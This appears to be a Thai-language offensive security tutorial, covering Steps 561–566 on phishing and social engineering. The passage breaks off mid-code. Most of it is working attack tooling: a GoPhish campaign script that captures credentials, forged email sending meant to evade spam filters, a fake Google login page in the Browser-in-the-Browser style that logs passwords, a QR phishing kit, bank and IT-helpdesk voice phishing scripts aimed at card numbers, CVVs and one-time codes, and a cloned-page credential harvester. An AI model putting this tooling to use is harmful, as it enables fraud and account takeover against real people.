# Part 57: Social Engineering & Advanced Phishing (Steps 561-570)

## Step 561: GoPhish Campaign Setup

GoPhish คือ framework สำหรับทำ phishing simulation แบบมืออาชีพ

```bash
# ติดตั้ง GoPhish
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
unzip gophish-v0.12.1-linux-64bit.zip
chmod +x gophish

# รัน GoPhish server
./gophish
# Default: https://localhost:3333 (admin)
# API: http://localhost:80
```

```python
import requests
import json
from dataclasses import dataclass, field
from typing import List, Optional
import urllib3
urllib3.disable_warnings()

@dataclass
class GoPhishCampaign:
    api_key: str
    base_url: str = "https://localhost:3333"
    
    def _headers(self) -> dict:
        return {
            "Authorization": f"Bearer {self.api_key}",
            "Content-Type": "application/json"
        }
    
    def create_sending_profile(self, name: str, smtp_host: str,
                                smtp_port: int, username: str,
                                password: str, from_addr: str) -> dict:
        """สร้าง sending profile"""
        data = {
            "name": name,
            "host": f"{smtp_host}:{smtp_port}",
            "from_address": from_addr,
            "username": username,
            "password": password,
            "ignore_cert_errors": True
        }
        r = requests.post(
            f"{self.base_url}/api/smtp",
            headers=self._headers(),
            json=data,
            verify=False
        )
        return r.json()
    
    def create_email_template(self, name: str, subject: str,
                               html_body: str, text_body: str = "") -> dict:
        """สร้าง email template"""
        data = {
            "name": name,
            "subject": subject,
            "html": html_body,
            "text": text_body,
            "attachments": []
        }
        r = requests.post(
            f"{self.base_url}/api/templates",
            headers=self._headers(),
            json=data,
            verify=False
        )
        return r.json()
    
    def create_landing_page(self, name: str, html: str,
                             capture_credentials: bool = True,
                             redirect_url: str = "") -> dict:
        """สร้าง landing page สำหรับเก็บ credentials"""
        data = {
            "name": name,
            "html": html,
            "capture_credentials": capture_credentials,
            "capture_passwords": True,
            "redirect_url": redirect_url
        }
        r = requests.post(
            f"{self.base_url}/api/pages",
            headers=self._headers(),
            json=data,
            verify=False
        )
        return r.json()
    
    def create_user_group(self, name: str, targets: List[dict]) -> dict:
        """สร้าง target group"""
        # targets = [{"first_name": "John", "last_name": "Doe",
        #             "email": "john@target.com", "position": "CEO"}]
        data = {
            "name": name,
            "targets": targets
        }
        r = requests.post(
            f"{self.base_url}/api/groups",
            headers=self._headers(),
            json=data,
            verify=False
        )
        return r.json()
    
    def launch_campaign(self, name: str, template_id: int,
                         landing_page_id: int, smtp_id: int,
                         group_id: int, url: str) -> dict:
        """เปิด phishing campaign"""
        data = {
            "name": name,
            "template": {"id": template_id},
            "page": {"id": landing_page_id},
            "smtp": {"id": smtp_id},
            "groups": [{"id": group_id}],
            "url": url,
            "launch_date": "2024-01-01T00:00:00+00:00"
        }
        r = requests.post(
            f"{self.base_url}/api/campaigns",
            headers=self._headers(),
            json=data,
            verify=False
        )
        return r.json()
    
    def get_campaign_results(self, campaign_id: int) -> dict:
        """ดูผลลัพธ์ campaign"""
        r = requests.get(
            f"{self.base_url}/api/campaigns/{campaign_id}/results",
            headers=self._headers(),
            verify=False
        )
        results = r.json()
        
        stats = {
            "sent": 0,
            "opened": 0,
            "clicked": 0,
            "submitted": 0,
            "credentials": []
        }
        
        for result in results.get("results", []):
            if result["status"] == "Email Sent":
                stats["sent"] += 1
            elif result["status"] == "Email Opened":
                stats["opened"] += 1
            elif result["status"] == "Clicked Link":
                stats["clicked"] += 1
            elif result["status"] == "Submitted Data":
                stats["submitted"] += 1
                for event in result.get("timeline", []):
                    if event.get("details"):
                        details = json.loads(event["details"])
                        if "payload" in details:
                            stats["credentials"].append({
                                "email": result["email"],
                                "data": details["payload"]
                            })
        
        return stats


# ตัวอย่าง Email Template สำหรับ IT Security Alert
IT_SECURITY_TEMPLATE = """
<html>
<body style="font-family: Arial, sans-serif;">
<div style="max-width: 600px; margin: 0 auto;">
    <div style="background-color: #d32f2f; color: white; padding: 15px;">
        <h2>⚠️ URGENT: Security Alert - Action Required</h2>
    </div>
    <div style="padding: 20px; background-color: #f5f5f5;">
        <p>Dear {{.FirstName}},</p>
        <p>Our security systems have detected <strong>suspicious login activity</strong> 
        on your account from an unrecognized device.</p>
        <p><strong>Location:</strong> Moscow, Russia<br>
        <strong>Time:</strong> {{.Date}}<br>
        <strong>Device:</strong> Unknown Windows PC</p>
        <p>To secure your account, please verify your identity immediately:</p>
        <a href="{{.URL}}" style="background-color: #1976d2; color: white; 
           padding: 12px 24px; text-decoration: none; border-radius: 4px;">
            Verify My Account Now
        </a>
        <p style="color: #666; font-size: 12px; margin-top: 20px;">
            If you don't act within 24 hours, your account will be temporarily suspended.
        </p>
    </div>
</div>
</body>
</html>
"""

if __name__ == "__main__":
    gophish = GoPhishCampaign(api_key="your_api_key")
    print("[*] GoPhish Campaign Manager initialized")
    print("[*] Use create_sending_profile(), create_email_template()")
    print("[*] create_landing_page(), create_user_group(), launch_campaign()")
```

## Step 562: Email Spoofing & SPF/DKIM Bypass

การ spoof email และวิธีหลีกเลี่ยง email authentication

```python
import smtplib
import dns.resolver
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import subprocess

class EmailSpoofingTester:
    def check_spf_record(self, domain: str) -> dict:
        """ตรวจสอบ SPF record ของ domain"""
        result = {
            "domain": domain,
            "has_spf": False,
            "spf_record": None,
            "spoofable": False,
            "analysis": []
        }
        
        try:
            answers = dns.resolver.resolve(domain, 'TXT')
            for rdata in answers:
                txt = str(rdata).strip('"')
                if txt.startswith('v=spf1'):
                    result["has_spf"] = True
                    result["spf_record"] = txt
                    
                    # วิเคราะห์ SPF policy
                    if txt.endswith('-all'):
                        result["analysis"].append("HARD FAIL: Strict SPF - hard to spoof")
                        result["spoofable"] = False
                    elif txt.endswith('~all'):
                        result["analysis"].append("SOFT FAIL: May pass through some servers")
                        result["spoofable"] = True  # อาจผ่านได้ใน some configs
                    elif txt.endswith('?all'):
                        result["analysis"].append("NEUTRAL: No enforcement - spoofable")
                        result["spoofable"] = True
                    elif txt.endswith('+all'):
                        result["analysis"].append("PASS ALL: Anyone can send - very spoofable")
                        result["spoofable"] = True
        except:
            result["has_spf"] = False
            result["analysis"].append("No SPF record - domain is spoofable")
            result["spoofable"] = True
        
        return result
    
    def check_dmarc_record(self, domain: str) -> dict:
        """ตรวจสอบ DMARC record"""
        result = {
            "domain": domain,
            "has_dmarc": False,
            "dmarc_record": None,
            "policy": None,
            "spoofable": False
        }
        
        try:
            answers = dns.resolver.resolve(f"_dmarc.{domain}", 'TXT')
            for rdata in answers:
                txt = str(rdata).strip('"')
                if txt.startswith('v=DMARC1'):
                    result["has_dmarc"] = True
                    result["dmarc_record"] = txt
                    
                    # Parse policy
                    for part in txt.split(';'):
                        if 'p=' in part:
                            policy = part.strip().split('=')[1]
                            result["policy"] = policy
                            if policy == 'none':
                                result["spoofable"] = True
                            elif policy == 'quarantine':
                                result["spoofable"] = True  # ยังส่งได้แต่อาจไป spam
                            elif policy == 'reject':
                                result["spoofable"] = False
        except:
            result["has_dmarc"] = False
            result["spoofable"] = True
        
        return result
    
    def find_spoofable_domains(self, domains: List[str]) -> List[dict]:
        """หา domains ที่ spoofable"""
        spoofable = []
        for domain in domains:
            spf = self.check_spf_record(domain)
            dmarc = self.check_dmarc_record(domain)
            
            if spf["spoofable"] or dmarc["spoofable"]:
                spoofable.append({
                    "domain": domain,
                    "spf_spoofable": spf["spoofable"],
                    "dmarc_spoofable": dmarc["spoofable"],
                    "spf_record": spf["spf_record"],
                    "dmarc_policy": dmarc["policy"]
                })
        
        return spoofable
    
    def send_spoofed_email(self, smtp_server: str, smtp_port: int,
                            from_name: str, from_addr: str,
                            to_addr: str, subject: str,
                            body: str, reply_to: str = None) -> bool:
        """ส่ง spoofed email ผ่าน open relay หรือ SMTP ที่ไม่มี auth"""
        msg = MIMEMultipart('alternative')
        msg['From'] = f"{from_name} <{from_addr}>"
        msg['To'] = to_addr
        msg['Subject'] = subject
        
        if reply_to:
            msg['Reply-To'] = reply_to
        
        # Add headers เพื่อหลีกเลี่ยง spam filters
        msg['X-Mailer'] = 'Microsoft Outlook 16.0'
        msg['X-Originating-IP'] = '10.0.0.1'
        
        msg.attach(MIMEText(body, 'html'))
        
        try:
            with smtplib.SMTP(smtp_server, smtp_port) as server:
                server.sendmail(from_addr, to_addr, msg.as_string())
            return True
        except Exception as e:
            print(f"[-] Send failed: {e}")
            return False
    
    def test_homograph_attack(self, domain: str) -> List[str]:
        """สร้าง homograph domains (Unicode lookalikes)"""
        # ตัวอักษร Unicode ที่หน้าตาเหมือน ASCII
        substitutions = {
            'a': ['а', 'ạ', 'à', 'á'],  # Cyrillic а
            'e': ['е', 'ė', 'ę'],         # Cyrillic е
            'o': ['о', 'ο', 'ọ'],         # Cyrillic/Greek о
            'i': ['і', 'ı', 'ï'],          # Cyrillic і
            'p': ['р', 'ρ'],               # Cyrillic р
            'c': ['с', 'ϲ'],               # Cyrillic с
        }
        
        similar_domains = []
        parts = domain.split('.')
        base = parts[0]
        tld = '.'.join(parts[1:])
        
        for i, char in enumerate(base):
            if char.lower() in substitutions:
                for sub in substitutions[char.lower()]:
                    new_domain = base[:i] + sub + base[i+1:]
                    similar_domains.append(f"{new_domain}.{tld}")
        
        return similar_domains


class SwissArmyPhisher:
    """Social engineering toolkit เบ็ดเสร็จ"""
    
    def generate_pretext_scenarios(self) -> List[dict]:
        """สร้าง pretext scenarios ที่น่าเชื่อถือ"""
        return [
            {
                "scenario": "IT Security Alert",
                "from": "security@company.com",
                "subject": "Urgent: Suspicious login detected on your account",
                "urgency": "high",
                "cta": "Verify identity"
            },
            {
                "scenario": "HR Password Reset",
                "from": "hr@company.com",
                "subject": "Action Required: Update your employee portal password",
                "urgency": "medium",
                "cta": "Reset password"
            },
            {
                "scenario": "Finance Invoice",
                "from": "accounting@vendor.com",
                "subject": "Invoice #12345 - Payment overdue",
                "urgency": "medium",
                "cta": "View invoice"
            },
            {
                "scenario": "CEO Wire Transfer",
                "from": "ceo@company.com",
                "subject": "Confidential: Urgent wire transfer needed",
                "urgency": "critical",
                "cta": "Process immediately"
            },
            {
                "scenario": "DocuSign Document",
                "from": "dse@docusign.net",
                "subject": "DocuSign: Please sign the attached document",
                "urgency": "low",
                "cta": "Review and sign"
            }
        ]

if __name__ == "__main__":
    tester = EmailSpoofingTester()
    
    # ทดสอบ domain
    domain = "example.com"
    spf = tester.check_spf_record(domain)
    dmarc = tester.check_dmarc_record(domain)
    
    print(f"[*] SPF: {spf}")
    print(f"[*] DMARC: {dmarc}")
    
    homographs = tester.test_homograph_attack(domain)
    print(f"[*] Homograph domains: {homographs[:5]}")
```

## Step 563: Browser-in-the-Browser (BitB) Attack

BitB คือ technique ที่สร้าง popup window ปลอมที่ดูเหมือน browser ของจริง

```python
from flask import Flask, render_template_string, request, redirect
import json

app = Flask(__name__)

BITB_PAGE = """
<!DOCTYPE html>
<html>
<head>
<title>Sign in to continue</title>
<style>
body { margin:0; font-family: Arial; background: rgba(0,0,0,0.5); 
       display:flex; justify-content:center; align-items:center; min-height:100vh; }
.modal { background: #fff; border-radius: 8px; box-shadow: 0 20px 60px rgba(0,0,0,0.5); 
         width: 500px; overflow: hidden; }
.titlebar { background: #e8e8e8; padding: 10px 15px; display:flex; 
            align-items:center; border-bottom: 1px solid #ccc; }
.traffic-lights { display:flex; gap:8px; margin-right:10px; }
.light { width:13px; height:13px; border-radius:50%; }
.red { background:#ff5f57; } .yellow { background:#febc2e; } .green { background:#28c840; }
.url-bar { background:#fff; border: 1px solid #ccc; border-radius:20px; 
           padding:5px 15px; flex:1; font-size:12px; color:#333; display:flex; align-items:center; }
.lock { margin-right:5px; color:#0a0; }
.content { padding: 40px; }
.google-logo { text-align:center; margin-bottom:25px; }
.google-logo img { width:75px; }
h2 { text-align:center; font-size:24px; font-weight:400; color:#202124; margin-bottom:8px; }
.subtitle { text-align:center; color:#5f6368; margin-bottom:25px; }
input[type=email], input[type=password] { 
    width:100%; box-sizing:border-box; padding:13px 15px;
    border:1px solid #dadce0; border-radius:4px; font-size:16px; margin-bottom:15px; }
input:focus { border-color:#1a73e8; outline:none; }
.btn-signin { background:#1a73e8; color:#fff; border:none; padding:13px; 
              width:100%; border-radius:4px; font-size:16px; cursor:pointer; }
.btn-signin:hover { background:#1557b0; }
.links { margin-top:15px; text-align:center; }
.links a { color:#1a73e8; text-decoration:none; font-size:14px; }
</style>
</head>
<body>
<div class="modal">
  <div class="titlebar">
    <div class="traffic-lights">
      <div class="light red"></div>
      <div class="light yellow"></div>
      <div class="light green"></div>
    </div>
    <div class="url-bar">
      <span class="lock">🔒</span>
      accounts.google.com
    </div>
  </div>
  <div class="content">
    <div class="google-logo">
      <svg width="75" height="24" viewBox="0 0 272 92">
        <path fill="#EA4335" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
        <path fill="#FBBC05" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
        <path fill="#4285F4" d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"/>
        <path fill="#34A853" d="M225 3v65h-9.5V3h9.5z"/>
        <path fill="#EA4335" d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"/>
      </svg>
    </div>
    <h2>Sign in</h2>
    <p class="subtitle">to continue to Google Account</p>
    <form method="POST" action="/capture">
      <input type="email" name="email" placeholder="Email or phone" required>
      <input type="password" name="password" placeholder="Enter your password" required>
      <button type="submit" class="btn-signin">Next</button>
    </form>
    <div class="links">
      <a href="#">Forgot email?</a> &nbsp;·&nbsp;
      <a href="#">Create account</a>
    </div>
  </div>
</div>
</body>
</html>
"""

LURE_PAGE = """
<!DOCTYPE html>
<html>
<head><title>Exclusive Content</title>
<script>
function openSignin() {
    var popup = window.open('', 'signin', 
        'width=500,height=600,scrollbars=no,resizable=no,status=no,location=no,toolbar=no,menubar=no');
    popup.document.write(`{{ bitb_content }}`);
    popup.document.close();
}
</script>
</head>
<body>
<h1>Premium Content</h1>
<p>Sign in with Google to access exclusive content</p>
<button onclick="openSignin()">Sign in with Google</button>
</body>
</html>
"""

captured_creds = []

@app.route('/')
def index():
    return render_template_string(LURE_PAGE, bitb_content=BITB_PAGE)

@app.route('/bitb')
def bitb():
    return BITB_PAGE

@app.route('/capture', methods=['POST'])
def capture():
    email = request.form.get('email', '')
    password = request.form.get('password', '')
    ip = request.remote_addr
    ua = request.headers.get('User-Agent', '')
    
    cred = {
        "email": email,
        "password": password,
        "ip": ip,
        "user_agent": ua
    }
    captured_creds.append(cred)
    print(f"[+] Captured: {email}:{password} from {ip}")
    
    # Redirect to real Google
    return redirect("https://accounts.google.com")

@app.route('/results')
def results():
    return json.dumps(captured_creds, indent=2)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=False)
```

## Step 564: QR Code Phishing (Quishing)

QR code phishing ใช้ QR code เพื่อ bypass email security filters

```python
import qrcode
import qrcode.image.svg
from PIL import Image, ImageDraw, ImageFont
import io
import base64
from pathlib import Path

class QRPhishingKit:
    def generate_phishing_qr(self, phishing_url: str,
                               output_path: str = "phish.png",
                               logo_path: str = None) -> str:
        """สร้าง QR code สำหรับ phishing"""
        qr = qrcode.QRCode(
            version=1,
            error_correction=qrcode.constants.ERROR_CORRECT_H,
            box_size=10,
            border=4,
        )
        qr.add_data(phishing_url)
        qr.make(fit=True)
        
        img = qr.make_image(fill_color="black", back_color="white").convert('RGB')
        
        # เพิ่ม logo ตรงกลาง (ถ้ามี)
        if logo_path and Path(logo_path).exists():
            logo = Image.open(logo_path)
            logo_size = img.size[0] // 4
            logo = logo.resize((logo_size, logo_size))
            logo_pos = ((img.size[0] - logo_size) // 2, (img.size[1] - logo_size) // 2)
            img.paste(logo, logo_pos)
        
        img.save(output_path)
        return output_path
    
    def create_phishing_document(self, qr_path: str, 
                                   lure_text: str,
                                   output_path: str = "security_notice.png") -> str:
        """สร้าง document ที่มี QR code พร้อม lure text"""
        # สร้าง canvas
        canvas = Image.new('RGB', (800, 600), 'white')
        draw = ImageDraw.Draw(canvas)
        
        # Header
        draw.rectangle([0, 0, 800, 80], fill='#1565c0')
        draw.text((20, 20), "SECURITY NOTICE", fill='white')
        draw.text((20, 50), "Immediate Action Required", fill='#bbdefb')
        
        # Lure text
        draw.text((50, 100), lure_text, fill='black')
        
        # QR code
        qr_img = Image.open(qr_path)
        qr_img = qr_img.resize((250, 250))
        canvas.paste(qr_img, (275, 200))
        
        # Instructions
        draw.text((200, 470), "Scan QR code to verify your identity", fill='#333')
        draw.text((250, 500), "Or visit: security-portal.company.com", fill='#1565c0')
        
        canvas.save(output_path)
        return output_path
    
    def generate_qr_email_html(self, phishing_url: str, 
                                from_brand: str = "Microsoft") -> str:
        """สร้าง HTML email ที่มี QR code (QR อยู่ใน email body ไม่ใช่ link)"""
        # สร้าง QR เป็น base64
        qr = qrcode.QRCode(error_correction=qrcode.constants.ERROR_CORRECT_H)
        qr.add_data(phishing_url)
        qr.make(fit=True)
        img = qr.make_image(fill_color="black", back_color="white")
        
        buffer = io.BytesIO()
        img.save(buffer, format='PNG')
        qr_b64 = base64.b64encode(buffer.getvalue()).decode()
        
        html = f"""
<html>
<body style="font-family: Segoe UI, Arial; max-width: 600px; margin: 0 auto;">
  <div style="background: #0078d4; padding: 20px; text-align: center;">
    <h1 style="color: white; margin: 0;">{from_brand}</h1>
  </div>
  <div style="padding: 30px; background: #f3f3f3;">
    <h2>Multi-Factor Authentication Update Required</h2>
    <p>Dear User,</p>
    <p>Your organization requires you to update your MFA settings.
       Please scan the QR code below using your Microsoft Authenticator app
       to complete the verification process.</p>
    <div style="text-align: center; padding: 20px; background: white; 
                border-radius: 8px; margin: 20px 0;">
      <img src="data:image/png;base64,{qr_b64}" width="200" height="200" alt="QR Code"/>
      <p style="color: #666; font-size: 12px;">Scan with your phone camera or Authenticator app</p>
    </div>
    <p style="color: #666; font-size: 12px;">
      If you did not request this, please contact your IT department immediately.
    </p>
  </div>
</body>
</html>
        """
        return html
    
    def bypass_email_security(self, phishing_url: str) -> dict:
        """เทคนิค QR phishing ที่หลีกเลี่ยง email security"""
        techniques = {
            "qr_as_image": "QR code ใน email body เป็น image - email scanner ไม่เห็น URL",
            "qr_in_pdf": "QR code ใน PDF attachment - sandbox อาจไม่ render PDF",
            "qr_in_docx": "QR code ใน Word document - ต้องเปิดไฟล์ก่อน",
            "qr_shortened": f"ใช้ URL shortener: bit.ly/{phishing_url[:8]}...",
            "qr_redirect": "QR → legitimate site → redirect → phishing page",
            "multi_layer": "QR → Google Forms → redirect → credential harvester"
        }
        return techniques

if __name__ == '__main__':
    kit = QRPhishingKit()
    
    phishing_url = "https://phishing-site.evil/microsoft/login"
    
    # สร้าง QR code
    qr_path = kit.generate_phishing_qr(phishing_url, "phish_qr.png")
    print(f"[+] QR code saved: {qr_path}")
    
    # สร้าง email HTML
    html = kit.generate_qr_email_html(phishing_url, "Microsoft")
    print(f"[+] Email HTML length: {len(html)} bytes")
    
    bypass_tips = kit.bypass_email_security(phishing_url)
    for technique, desc in bypass_tips.items():
        print(f"[*] {technique}: {desc}")
```

## Step 565: Vishing (Voice Phishing) Scripts

Vishing คือการโจมตีด้วยการโทรศัพท์เพื่อ social engineer เป้าหมาย

```python
from dataclasses import dataclass, field
from typing import List, Dict
import random

@dataclass
class VishingScript:
    scenario: str
    caller_role: str
    target_role: str
    objective: str
    script: List[Dict[str, str]]
    success_indicators: List[str]
    fallback_responses: Dict[str, str]

class VishingPlaybook:
    def it_helpdesk_scenario(self) -> VishingScript:
        """สคริปต์แอบอ้างเป็น IT Helpdesk"""
        return VishingScript(
            scenario="IT Helpdesk - Security Alert",
            caller_role="IT Security Analyst (John from IT)",
            target_role="Regular Employee",
            objective="Obtain VPN credentials or install remote access tool",
            script=[
                {
                    "caller": "Hello, this is John from the IT Security team. Am I speaking with [Target Name]?",
                    "goal": "Confirm target identity"
                },
                {
                    "caller": "Hi [Name], I'm calling because our security monitoring system detected unusual activity on your account. It looks like someone may have accessed your email from an IP address in Eastern Europe.",
                    "goal": "Create urgency and fear"
                },
                {
                    "caller": "For your protection, I need to verify your identity and then walk you through some security steps. Can you confirm your employee ID and the last 4 digits of your SSN?",
                    "goal": "Gather initial information"
                },
                {
                    "caller": "I'm going to need to remotely access your computer to run our security scanner. Can you go to our IT portal at [phishing-url] and click 'Allow IT Access'?",
                    "goal": "Get remote access"
                },
                {
                    "caller": "While I'm scanning, can you also confirm your VPN username and password so I can check the access logs?",
                    "goal": "Obtain VPN credentials"
                }
            ],
            success_indicators=[
                "Target provides employee ID",
                "Target visits phishing URL",
                "Target provides VPN credentials",
                "Target installs remote access tool"
            ],
            fallback_responses={
                "how do I know you're from IT": "You can call back at our main helpdesk number 555-HELP and ask for John in Security, but we really need to act quickly before the hacker does more damage.",
                "I need to check with my manager": "Of course, but please do that quickly. Every minute we wait, the attacker could be exfiltrating more data. Your manager would want you to act.",
                "I don't feel comfortable": "I completely understand. But I'm required to note that if we can't secure your account and data is breached, HR may need to investigate your negligence in responding.",
                "let me call IT directly": "That's actually the best idea. Ask for me, John Martinez, ext 2847, Security team. Tell them about the Eastern European login."
            }
        )
    
    def bank_fraud_scenario(self) -> VishingScript:
        """สคริปต์แอบอ้างเป็น Bank Fraud Department"""
        return VishingScript(
            scenario="Bank Fraud Department",
            caller_role="Bank Fraud Analyst",
            target_role="Bank Customer",
            objective="Obtain banking credentials and OTP",
            script=[
                {
                    "caller": "Hello, this is Sarah from First National Bank's Fraud Prevention department. Is this [Name]?",
                    "goal": "Establish credibility"
                },
                {
                    "caller": "We've flagged some suspicious transactions on your account. There were 3 charges in the last hour: $299 at Amazon, $150 at Target, and $500 at BestBuy. Did you make these?",
                    "goal": "Create alarm - if they say no, great. If they say yes, adjust script."
                },
                {
                    "caller": "For security purposes, I'll need to verify your identity. Can you confirm your full card number and the 3-digit security code on the back?",
                    "goal": "Obtain card details"
                },
                {
                    "caller": "I'm sending you a one-time code to verify you're the account holder. What is the code you just received?",
                    "goal": "Intercept MFA/OTP"
                },
                {
                    "caller": "Perfect. I'm reversing those charges now. You'll also receive an email to reset your online banking password as a precaution.",
                    "goal": "Complete attack and cover tracks"
                }
            ],
            success_indicators=[
                "Target provides card number",
                "Target provides CVV",
                "Target reads OTP code",
                "Target resets password via phishing link"
            ],
            fallback_responses={
                "call me at the number on my card": "I can transfer you, or you can call us back. Our fraud line is 1-800-555-BANK. Ask for case #FR-2024-8847.",
                "I don't give card numbers over phone": "You're absolutely right to be cautious. Instead, you can verify through our secure portal. I'll send you a text with the link."
            }
        )
    
    def generate_spoofed_caller_id_guide(self) -> dict:
        """คู่มือ Caller ID Spoofing"""
        return {
            "services": [
                "SpoofCard - Commercial spoofing service",
                "SpoofTel - Web-based caller ID spoofer",
                "Twilio - Programmable phone numbers",
                "Asterisk PBX - self-hosted with custom CID"
            ],
            "legal_note": "Caller ID spoofing is illegal in many jurisdictions for malicious purposes",
            "technical": {
                "sip_header": "Modify SIP From: header in Asterisk/FreePBX",
                "twilio": "Use Twilio API with 'from' parameter set to target number"
            },
            "opsec": [
                "Use VoIP through VPN",
                "Never call from personal number",
                "Use burner phone as backup",
                "Record calls for analysis (where legal)"
            ]
        }
    
    def pretext_preparation_checklist(self, target_company: str) -> List[str]:
        """Checklist เตรียม pretext ก่อน vishing call"""
        return [
            f"Research {target_company} org chart via LinkedIn",
            "Find real employee names for specific departments",
            "Get direct phone numbers from company website",
            "Learn internal jargon and system names",
            "Research recent company news/events to reference",
            "Prepare authentic-sounding case/ticket numbers",
            "Set up spoofed caller ID matching company number",
            "Practice the script with colleague (blue team member)",
            "Prepare fallback responses for skeptical targets",
            "Have escalation path ready (ask for supervisor)"
        ]

if __name__ == '__main__':
    playbook = VishingPlaybook()
    
    it_script = playbook.it_helpdesk_scenario()
    print(f"[*] Scenario: {it_script.scenario}")
    print(f"[*] Objective: {it_script.objective}")
    print(f"\n[*] Script Steps:")
    for i, step in enumerate(it_script.script, 1):
        print(f"  Step {i}: {step['caller'][:60]}...")
    
    checklist = playbook.pretext_preparation_checklist("TargetCorp")
    print(f"\n[*] Preparation Checklist:")
    for item in checklist:
        print(f"  ☐ {item}")
```

## Step 566: Credential Harvester Setup

การสร้าง credential harvesting pages ที่ clone จาก legitimate sites

```python
import requests
from bs4 import BeautifulSoup
import re
import os
from pathlib import Path
from flask import Flask, request, redirect, render_template_string
import json
import datetime

class CredentialHarvester:
    def __init__(self, output_dir: str = "harvested"):
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
        self.captured = []
    
    def clone_login_page(self, target_url: str, site_name: str) -> str:
        """Clone login page จาก target URL"""
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        r = requests.get(target_url, headers=headers)
        soup = BeautifulSoup(r.text, 'html.parser')
        
        # แก้ไข form action ให้ชี้มาที่ harvester
        for form in soup.find_all('form'):
            form['action'] = '/harvest'
            form['method'] = 'POST'
        
        # แก้ไข relative URLs ให้เป็น absolute
        base_url = '/'.join(target_url.split('/')[:3])
        
        for tag in soup.find_all(['img', 'link', 'script']):
            for attr in ['src', 'href']:
                if tag.get(attr) and not tag[attr].startswith('http'):
                    if tag[attr].startswith('/'):
                        tag[attr] = base_url + tag[attr]
                    else:
                        tag[attr] = base_url + '/' + tag[attr]
        
        # เพิ่ม hidden fields เพื่อ track campaign
        for form in soup.find_all('form'):
            hidden = soup.new_tag('input')
            hidden['type'] = 'hidden'
            hidden['name'] = '_campaign'
            hidden['value'] = site_name
            form.append(hidden)
        
        html = str(soup)
        clone_path = self.output_dir / f"{site_name}_clone.html"
        clone_path.write_text(html)
        
        return str(clone_path)
    
    def create_custom_harvester(self, brand: str, 
                                 logo_url: str = None) -> str:
        """สร้าง custom credential harvester"""
        template = f"""
<!DOCTYPE html>
<html>
<head>
  <title>{brand} - Sign In</title>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    * {{ box-sizing: border-box; }}
    body {{ margin: 0; font-family: 'Segoe UI', sans-serif; background: #f0f2f5; 
           display: flex; justify-content: center; align-items: center; min-height: 100vh; }}
    .container {{ background: white; padding: 40px; border-radius: 8px; 
                 box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 400px; }}
    .logo {{ text-align: center; margin-bottom: 30px; }}
    .logo h1 {{ color: #1a73e8; margin: 0; }}
    h2 {{ text-align: center; color: #333; margin-bottom: 25px; }}
    .form-group {{ margin-bottom: 20px; }}
    label {{ display: block; margin-bottom: 5px; color: #555; font-size: 14px; }}
    input {{ width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 4px; 
             font-size: 16px; transition: border-color 0.3s; }}
    input:focus {{ border-color: #1a73e8; outline: none; box-shadow: 0 0 0 2px rgba(26,115,232,0.2); }}
    button {{ width: 100%; padding: 14px; background: #1a73e8; color: white; 
              border: none; border-radius: 4px; font-size: 16px; cursor: pointer; 
              font-weight: 500; }}
    button:hover {{ background: #1557b0; }}
    .footer {{ text-align: center; margin-top: 20px; font-size: 12px; color: #999; }}
    .footer a {{ color: #1a73e8; text-decoration: none; }}
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">
      {'<img src="' + logo_url + '" height="40" alt="Logo">' if logo_url else f'<h1>{brand}</h1>'}
    </div>
    <h2>Welcome back</h2>
    <form method="POST" action="/harvest">
      <input type="hidden" name="_site" value="{brand}">
      <div class="form-group">
        <label>Email address</label>
        <input type="email" name="username" placeholder="Enter your email" required>
      </div>
      <div class="form-group">
        <label>Password</label>
        <input type="password" name="password" placeholder="Enter your password" required>
      </div>
      <button type="submit">Sign in</button>
    </form>
    <div class="footer">
      <a href="#">Forgot password?</a> · <a href="#">Create account</a>
    </div>
  </div>
</body>
</html>
        """
        
        template_path = self.output_dir / f"{brand.lower()}_harvester.html"
        template_path.write_text(template)
        return str(template_path)
    
    def start_server(self, port: int = 8080, redirect_url: str = "https://google.com"):
        """เริ่ม Flask server สำหรับ credential harvesting"""
        app = Flask(__name__)
        harvester = self
        
        @app.route('/')
        def index():
            return render_template_string(open(harvester.output_dir / 'custom.html').read())
        
        @app.route('/harvest', methods=['POST'])
        def harvest():
            data = {
